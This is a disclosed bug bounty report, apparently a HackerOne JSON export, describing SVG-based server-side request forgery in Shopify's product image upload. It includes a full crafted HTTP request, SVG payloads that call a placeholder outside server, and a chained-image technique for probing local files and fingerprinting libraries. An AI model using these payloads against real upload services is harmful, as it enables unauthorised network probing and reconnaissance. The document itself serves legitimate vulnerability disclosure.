{"id":223203,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjMyMDM=","url":"https://hackerone.com/reports/223203","title":"SVG Server Side Request Forgery (SSRF)","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-04-23T14:43:15.224Z","submitted_at":"2017-04-23T14:43:15.224Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"floyd","url":"/floyd","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/111/469/c180556a9581571521f1f7fad2da4776fc9fa9c6_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-09-22T09:09:19.529Z","bug_reporter_agreed_on_going_public_at":"2017-09-22T09:09:19.442Z","team_member_agreed_on_going_public_at":"2017-07-19T13:34:36.488Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I found an issue which seems to be regression of the following issue: https://hackerone.com/reports/97501 . It seems your input validaton is not sufficient and the file is getting processed before your implemented check for valid file types.\n\nWhen adding a new product in the store, images for the product can be uploaded. When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.\n\nThe following requests leads to an DNS and HTTP interaction with \u003cEXAMPLE_SERVER\u003e, a placeholder for any server on the Internet:\n\n```\nPOST /admin/products/9577763394/images.json HTTP/1.1\nHost: 667667.myshopify.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nX-CSRF-Token: ca/m3aW88KsRSpDmudAHJrJBPrXdClc4T/D88ZltUf6E0YUeKneGI5CZtDJFo6wHg+EY+Q4h0uPU8rqnmm/Ydw==\nX-Requested-With: XMLHttpRequest\nContent-Length: 671\nContent-Type: multipart/form-data; boundary=---------------------------1184233411771235065729422741\nCookie: \u003cREDACTED\u003e\nConnection: close\n\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\"image[attachment]\"; filename=\"NagKSvgXlink2.png\"\nContent-Type: image/svg+xml\n\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\u003cimage height=\"200\" width=\"200\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e/image.jpeg\" /\u003e\u003c/svg\u003e\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\"image[alt]\"\n\n\n-----------------------------1184233411771235065729422741--\n```\n\nAlthough the Shopify server responds with a HTTP 422 message, the interaction takes place with \u003cEXAMPLE_SERVER\u003e:\n\n```\nHTTP/1.1 422 Unprocessable Entity\nServer: nginx\nDate: Fri, 21 Apr 2017 11:17:02 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nReferrer-Policy: origin-when-cross-origin\nX-Frame-Options: DENY\nX-ShopId: 19430493\nX-ShardId: 1\nX-Stats-UserId: 110274114\nCache-Control: no-cache, no-store\nSet-Cookie: request_method=POST; path=/\nContent-Security-Policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval' https://* shopify-pos://*; child-src 'self' https://* shopify-pos://*; connect-src 'self' wss://* https://*; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://stats.g.doubleclick.net https://www.google-analytics.com https://visitors.shopify.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com 'self' 'unsafe-inline' 'unsafe-eval'; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=create\u0026source%5Bapp%5D=Shopify\u0026source%5Bcontroller%5D=admin%2Fproduct_images\u0026source%5Bsection%5D=admin\u0026source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block; report=/xss-report?source%5Baction%5D=create\u0026source%5Bapp%5D=Shopify\u0026source%5Bcontroller%5D=admin%2Fproduct_images\u0026source%5Bsection%5D=admin\u0026source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Dc: ash,chi2\nX-Request-ID: 834e8c11-d80b-4d00-a213-78619aebe696\nContent-Length: 109\n\n{\"errors\":{\"image\":[\"The uploaded image is corrupt and cannot be processed. Please try a different image.\"]}}\n```\n\nThe interaction with \u003cEXAMPLE_SERVER\u003e for HTTP is:\n\n```\nGET /image.jpeg HTTP/1.0\nHost: \u003cEXAMPLE_SERVER\u003e\nAccept-Encoding: gzip \n```\n\nTo further analyse the issue, let's only talk about the SVG file content in the request:\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\n\u003cimage height=\"200\" width=\"200\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e/image.jpeg\" /\u003e\n\u003c/svg\u003e\n```\n\n\nA couple of facts:\n- When changing the `http://\u003cEXAMPLE_SERVER\u003e/image.jpeg` part to other protocols, only `http://` and `ftp://` lead to interaction with a server on the Internet. No other protocol on the following list does: https://www.w3.org/wiki/UriSchemes . \n- I tried to connect with the HTTP and FTP protocol to all 65535 TCP ports on my server. Shopify seems to have outbound filters on only one TCP port, 113. On all other ports I got a TCP SYN packet with both protocols. Often companies detect this kind of port scan from their network hosts, I don't know if you did.\n- The parser doesn't mind a static entity:\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003c!DOCTYPE testingxxe [ \u003c!ENTITY xml \"eXtensible Markup Language\"\u003e ]\u003e\n\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e/image.jpg\" /\u003e\n\u003ctext x=\"0\" y=\"20\" font-size=\"20\"\u003e\u0026xml;\u003c/text\u003e\n\u003c/svg\u003e\n```\n- The \"a billion laughs\" attack - see https://en.wikipedia.org/wiki/Billion_laughs - is probably possible as static entities are allowed, but DoS is not in the scope of your bug bounty program.\n- However, the parser *doesn't* like SYSTEM Entities, we can *not* specify a different DTD file, add SYSTEM entities or any other XXE attack.\n\nBut we can use two image references and as long as the first URL returns a valid image, the second one is requested as well:\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e:81/example.png\" /\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e:999/example.png\" /\u003e\n\u003ctext x=\"0\" y=\"20\" font-size=\"20\"\u003etest\u003c/text\u003e\n\u003c/svg\u003e\n```\n\nThis results in a Is-Picture-Present-Oracle. By sending a local path first we can find out if a file that includes a picture is present on the file system. Because we get an interaction for the following SVG, we know the picture /lib/plymouth/ubuntu_logo.png is present on the system (this does *not* work with non-image files like /etc/passwd):\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003csvg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"/lib/plymouth/ubuntu_logo.png\" /\u003e\n\u003cimage height=\"30\" width=\"30\" xlink:href=\"http://\u003cEXAMPLE_SERVER\u003e:999/example.png\" /\u003e\n\u003ctext x=\"0\" y=\"20\" font-size=\"20\"\u003etest\u003c/text\u003e\n\u003c/svg\u003e\n```\n\nThe following pictures allow us to fingerprint the versions of libraries installed on your server (these three files are present on your servers):\n- /usr/share/doc/libpng12-dev/examples/pngtest.png (you have libpng12-dev installed, etc.)\n- /usr/share/doc/libfreetype6/tutorial/metrics.png \n- /usr/share/doc/libexpat1-dev/expat.html/expat.png\n\n","vulnerability_information_html":"\u003cp\u003eI found an issue which seems to be regression of the following issue: \u003ca title=\"https://hackerone.com/reports/97501\" href=\"https://hackerone.com/reports/97501\"\u003ehttps://hackerone.com/reports/97501\u003c/a\u003e . It seems your input validaton is not sufficient and the file is getting processed before your implemented check for valid file types.\u003c/p\u003e\n\n\u003cp\u003eWhen adding a new product in the store, images for the product can be uploaded. When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.\u003c/p\u003e\n\n\u003cp\u003eThe following requests leads to an DNS and HTTP interaction with \u0026lt;EXAMPLE_SERVER\u0026gt;, a placeholder for any server on the Internet:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /admin/products/9577763394/images.json HTTP/1.1\nHost: 667667.myshopify.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nX-CSRF-Token: ca/m3aW88KsRSpDmudAHJrJBPrXdClc4T/D88ZltUf6E0YUeKneGI5CZtDJFo6wHg+EY+Q4h0uPU8rqnmm/Ydw==\nX-Requested-With: XMLHttpRequest\nContent-Length: 671\nContent-Type: multipart/form-data; boundary=---------------------------1184233411771235065729422741\nCookie: \u0026lt;REDACTED\u0026gt;\nConnection: close\n\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\u0026quot;image[attachment]\u0026quot;; filename=\u0026quot;NagKSvgXlink2.png\u0026quot;\nContent-Type: image/svg+xml\n\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\u0026lt;svg xmlns:svg=\u0026quot;http://www.w3.org/2000/svg\u0026quot; xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot; xmlns:xlink=\u0026quot;http://www.w3.org/1999/xlink\u0026quot; width=\u0026quot;200\u0026quot; height=\u0026quot;200\u0026quot;\u0026gt;\u0026lt;image height=\u0026quot;200\u0026quot; width=\u0026quot;200\u0026quot; xlink:href=\u0026quot;http://\u0026lt;EXAMPLE_SERVER\u0026gt;/image.jpeg\u0026quot; /\u0026gt;\u0026lt;/svg\u0026gt;\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\u0026quot;image[alt]\u0026quot;\n\n\n-----------------------------1184233411771235065729422741--\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlthough the Shopify server responds with a HTTP 422 message, the interaction takes place with \u0026lt;EXAMPLE_SERVER\u0026gt;:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 422 Unprocessable Entity\nServer: nginx\nDate: Fri, 21 Apr 2017 11:17:02 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nReferrer-Policy: origin-when-cross-origin\nX-Frame-Options: DENY\nX-ShopId: 19430493\nX-ShardId: 1\nX-Stats-UserId: 110274114\nCache-Control: no-cache, no-store\nSet-Cookie: request_method=POST; path=/\nContent-Security-Policy: default-src \u0026#39;self\u0026#39; data: blob: \u0026#39;unsafe-inline\u0026#39; \u0026#39;unsafe-eval\u0026#39; https://* shopify-pos://*; child-src \u0026#39;self\u0026#39; https://* shopify-pos://*; connect-src \u0026#39;self\u0026#39; wss://* https://*; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://stats.g.doubleclick.net https://www.google-analytics.com https://visitors.shopify.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; \u0026#39;unsafe-eval\u0026#39;; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=create\u0026amp;source%5Bapp%5D=Shopify\u0026amp;source%5Bcontroller%5D=admin%2Fproduct_images\u0026amp;source%5Bsection%5D=admin\u0026amp;source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block; report=/xss-report?source%5Baction%5D=create\u0026amp;source%5Bapp%5D=Shopify\u0026amp;source%5Bcontroller%5D=admin%2Fproduct_images\u0026amp;source%5Bsection%5D=admin\u0026amp;source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Dc: ash,chi2\nX-Request-ID: 834e8c11-d80b-4d00-a213-78619aebe696\nContent-Length: 109\n\n{\u0026quot;errors\u0026quot;:{\u0026quot;image\u0026quot;:[\u0026quot;The uploaded image is corrupt and cannot be processed. Please try a different image.\u0026quot;]}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe interaction with \u0026lt;EXAMPLE_SERVER\u0026gt; for HTTP is:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /image.jpeg HTTP/1.0\nHost: \u0026lt;EXAMPLE_SERVER\u0026gt;\nAccept-Encoding: gzip \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo further analyse the issue, let\u0026#39;s only talk about the SVG file content in the request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:svg=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xlink=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xlink\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;image\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exlink:href=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://\u0026lt;EXAMPLE_SERVER\u0026gt;/image.jpeg\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eA couple of facts:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eWhen changing the \u003ccode\u003ehttp://\u0026lt;EXAMPLE_SERVER\u0026gt;/image.jpeg\u003c/code\u003e part to other protocols, only \u003ccode\u003ehttp://\u003c/code\u003e and \u003ccode\u003eftp://\u003c/code\u003e lead to interaction with a server on the Internet. No other protocol on the following list does: \u003ca title=\"https://www.w3.org/wiki/UriSchemes\" href=\"/redirect?url=https%3A%2F%2Fwww.w3.org%2Fwiki%2FUriSchemes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.w3.org/wiki/UriSchemes\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e . \u003c/li\u003e\n\u003cli\u003eI tried to connect with the HTTP and FTP protocol to all 65535 TCP ports on my server. Shopify seems to have outbound filters on only one TCP port, 113. On all other ports I got a TCP SYN packet with both protocols. Often companies detect this kind of port scan from their network hosts, I don\u0026#39;t know if you did.\u003c/li\u003e\n\u003cli\u003eThe parser doesn\u0026#39;t mind a static entity:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE testingxxe [ \u0026lt;!ENTITY xml \u0026quot;eXtensible Markup Language\u0026quot;\u0026gt;\u003c/span\u003e ]\u0026gt;\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:svg=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xlink=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xlink\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;image\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exlink:href=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://\u0026lt;EXAMPLE_SERVER\u0026gt;/image.jpg\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;text\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;20\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003efont-size=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;20\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"ni\"\u003e\u0026amp;xml;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/text\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u0026quot;a billion laughs\u0026quot; attack - see \u003ca title=\"https://en.wikipedia.org/wiki/Billion_laughs\" href=\"/redirect?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FBillion_laughs\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://en.wikipedia.org/wiki/Billion_laughs\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - is probably possible as static entities are allowed, but DoS is not in the scope of your bug bounty program.\u003c/li\u003e\n\u003cli\u003eHowever, the parser \u003cem\u003edoesn\u0026#39;t\u003c/em\u003e like SYSTEM Entities, we can \u003cem\u003enot\u003c/em\u003e specify a different DTD file, add SYSTEM entities or any other XXE attack.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBut we can use two image references and as long as the first URL returns a valid image, the second one is requested as well:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:svg=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xlink=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xlink\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;image\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exlink:href=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://\u0026lt;EXAMPLE_SERVER\u0026gt;:81/example.png\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;image\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exlink:href=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://\u0026lt;EXAMPLE_SERVER\u0026gt;:999/example.png\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;text\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;20\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003efont-size=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;20\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003etest\u003cspan class=\"nt\"\u003e\u0026lt;/text\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis results in a Is-Picture-Present-Oracle. By sending a local path first we can find out if a file that includes a picture is present on the file system. Because we get an interaction for the following SVG, we know the picture /lib/plymouth/ubuntu_logo.png is present on the system (this does \u003cem\u003enot\u003c/em\u003e work with non-image files like /etc/passwd):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:svg=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xlink=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xlink\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;image\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exlink:href=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/lib/plymouth/ubuntu_logo.png\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;image\u003c/span\u003e \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;30\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003exlink:href=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://\u0026lt;EXAMPLE_SERVER\u0026gt;:999/example.png\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;text\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;20\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003efont-size=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;20\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003etest\u003cspan class=\"nt\"\u003e\u0026lt;/text\u0026gt;\u003c/span\u003e\n\u003cspan 